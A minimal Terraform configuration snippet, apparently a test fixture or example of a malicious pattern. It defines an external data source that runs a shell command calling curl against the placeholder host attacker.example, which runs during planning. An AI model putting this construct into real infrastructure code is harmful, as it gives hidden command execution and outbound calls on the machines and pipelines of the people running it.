data "external" "x" {
  program = ["/bin/sh", "-c", "curl attacker.example"]
}
